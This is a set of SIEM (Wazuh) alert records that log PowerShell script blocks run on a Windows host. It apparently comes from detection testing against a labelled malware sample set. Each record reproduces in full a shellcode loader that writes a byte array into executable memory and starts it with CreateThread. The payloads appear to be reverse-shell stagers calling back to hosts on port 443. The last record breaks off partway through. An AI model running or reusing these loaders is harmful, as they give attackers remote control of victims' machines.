{"timestamp":"2026-07-06T02:18:35.937+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":55,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304315.2095165","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:56.3099762Z","eventRecordID":"144887","processID":"8676","threadID":"1352","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 2398e19e-a651-4268-8d25-0951b9d62716\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"2398e19e-a651-4268-8d25-0951b9d62716"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:37.199+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":56,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304317.2106681","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:57.9104338Z","eventRecordID":"144894","processID":"7020","threadID":"8316","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xd4,0x30,0x0c,0x92,0xda,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0xdb,0xd2,0xf9,0x6e,0x0b,0x90,0x02,0x8f,0xcb,0xf5,0x8b,0x6a,0xfa,0x35,0xef,0xff,0xac,0x85,0x7b,0xad,0x40,0x6d,0x29,0x46,0xd3,0x03,0xe6,0x69,0x54,0xa9,0xd0,0x44,0x65,0x82,0x21,0xc6,0xe5,0xd9,0x75,0x28,0xd4,0x11,0x88,0x29,0x11,0x4f,0x61,0x7b,0xca,0x1b,0xd4,0x6c,0x7f,0x51,0xe5,0x07,0x33,0x77,0x6d,0xfb,0x83,0x76,0x5c,0xaa,0x98,0x20,0x7e,0x4c,0x4d,0x59,0x37,0x56,0x92,0x64,0x81,0xed,0x60,0x12,0x10,0x24,0xb9,0xdb,0xbf,0x09,0x76,0x2e,0xc1,0x4e,0xb0,0xd1,0xb4,0xa6,0xc3,0x6c,0xcf,0x7c,0xbe,0xaa,0x5a,0x67,0x18,0x38,0xfc,0x43,0x99,0xed,0x9b,0x00,0x95,0x5a,0xef,0x4f,0xb9,0x5d,0x3c,0xe4,0xc5,0xd6,0xc3,0x2b,0x4c,0xac,0xe7,0xef,0x15,0x76,0x89,0xb6,0xf3,0xd9,0xb6,0xa9,0x5c,0x85,0x12,0xa1,0x70,0xd2,0x2e,0xe8,0x1c,0x17,0x03,0x13,0xdc,0x3f,0x14,0x60,0xee,0xe0,0x8e,0xee,0x42,0x68,0x09,0xe8,0xa5,0x43,0xed,0x66,0x58,0x6c,0x0e,0xae,0x9e,0x38,0x5e,0xd8,0x37,0x41,0x35,0x18,0xb8,0x94,0xa0,0x1d,0x2e,0x39,0x41,0xc8,0x57,0x2d,0xab,0xf4,0xb6,0xf2,0x22,0x12,0xe8,0x5a,0x65,0x8b,0x48,0x0b,0xc5,0x7b,0x20,0x41,0xca,0xa4,0x50,0x6a,0x00,0xcd,0xfa,0x85,0xfd,0xa5,0x92,0x3c,0xa4,0x3e,0x03,0xc0,0x72,0x3b,0x03,0x4a,0x71,0xbb,0xcd,0xbb,0xfc,0xaf,0xb9,0x4b,0x4b,0x8d,0x6f,0x53,0x61,0xb8,0x8f,0xc1,0x8e,0x6b,0xd8,0x7d,0x8d,0x4a,0x2e,0x22,0x6e,0xb9,0x25,0xeb,0xfa,0x02,0x51,0x14,0xeb,0x82,0xa1,0x42,0x61,0x83,0xc9,0x32,0xd1,0xd0,0xec,0x3c,0xcc,0x44,0xbd,0xa8,0xef,0x3c,0x12,0x7a,0x98,0xc2,0x4d,0x4c,0x07,0x3c,0xb8,0x4c,0x7b,0xeb,0x84,0x3a,0x95,0x2f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 3ea62b94-1928-4ceb-8a31-5a04706f1793\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1524.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xd4,0x30,0x0c,0x92,0xda,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0xdb,0xd2,0xf9,0x6e,0x0b,0x90,0x02,0x8f,0xcb,0xf5,0x8b,0x6a,0xfa,0x35,0xef,0xff,0xac,0x85,0x7b,0xad,0x40,0x6d,0x29,0x46,0xd3,0x03,0xe6,0x69,0x54,0xa9,0xd0,0x44,0x65,0x82,0x21,0xc6,0xe5,0xd9,0x75,0x28,0xd4,0x11,0x88,0x29,0x11,0x4f,0x61,0x7b,0xca,0x1b,0xd4,0x6c,0x7f,0x51,0xe5,0x07,0x33,0x77,0x6d,0xfb,0x83,0x76,0x5c,0xaa,0x98,0x20,0x7e,0x4c,0x4d,0x59,0x37,0x56,0x92,0x64,0x81,0xed,0x60,0x12,0x10,0x24,0xb9,0xdb,0xbf,0x09,0x76,0x2e,0xc1,0x4e,0xb0,0xd1,0xb4,0xa6,0xc3,0x6c,0xcf,0x7c,0xbe,0xaa,0x5a,0x67,0x18,0x38,0xfc,0x43,0x99,0xed,0x9b,0x00,0x95,0x5a,0xef,0x4f,0xb9,0x5d,0x3c,0xe4,0xc5,0xd6,0xc3,0x2b,0x4c,0xac,0xe7,0xef,0x15,0x76,0x89,0xb6,0xf3,0xd9,0xb6,0xa9,0x5c,0x85,0x12,0xa1,0x70,0xd2,0x2e,0xe8,0x1c,0x17,0x03,0x13,0xdc,0x3f,0x14,0x60,0xee,0xe0,0x8e,0xee,0x42,0x68,0x09,0xe8,0xa5,0x43,0xed,0x66,0x58,0x6c,0x0e,0xae,0x9e,0x38,0x5e,0xd8,0x37,0x41,0x35,0x18,0xb8,0x94,0xa0,0x1d,0x2e,0x39,0x41,0xc8,0x57,0x2d,0xab,0xf4,0xb6,0xf2,0x22,0x12,0xe8,0x5a,0x65,0x8b,0x48,0x0b,0xc5,0x7b,0x20,0x41,0xca,0xa4,0x50,0x6a,0x00,0xcd,0xfa,0x85,0xfd,0xa5,0x92,0x3c,0xa4,0x3e,0x03,0xc0,0x72,0x3b,0x03,0x4a,0x71,0xbb,0xcd,0xbb,0xfc,0xaf,0xb9,0x4b,0x4b,0x8d,0x6f,0x53,0x61,0xb8,0x8f,0xc1,0x8e,0x6b,0xd8,0x7d,0x8d,0x4a,0x2e,0x22,0x6e,0xb9,0x25,0xeb,0xfa,0x02,0x51,0x14,0xeb,0x82,0xa1,0x42,0x61,0x83,0xc9,0x32,0xd1,0xd0,0xec,0x3c,0xcc,0x44,0xbd,0xa8,0xef,0x3c,0x12,0x7a,0x98,0xc2,0x4d,0x4c,0x07,0x3c,0xb8,0x4c,0x7b,0xeb,0x84,0x3a,0x95,0x2f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"3ea62b94-1928-4ceb-8a31-5a04706f1793","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1524.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:38.807+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":57,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304318.2117990","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:58.7963256Z","eventRecordID":"144898","processID":"6900","threadID":"4212","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x01,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1870a363-1732-40c7-87e5-e231b056f5a0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1530.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x01,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1870a363-1732-40c7-87e5-e231b056f5a0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1530.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:39.745+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":58,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304319.2128939","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:59.5572010Z","eventRecordID":"144902","processID":"8504","threadID":"8336","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xe8,0x3a,0x10,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x49,0x30,0x0d,0x76,0x2e,0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5,0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01,0x59,0xb9,0xa7,0x46,0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0xad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0xd1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,0x68,0xb7,0x9d,0xfe,0x13,0x63,0x2b,0xe5,0xb3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,0xb5,0x27,0x5d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,0x17,0xa1,0x5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,0xd3,0x9e,0x6d,0x5e,0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc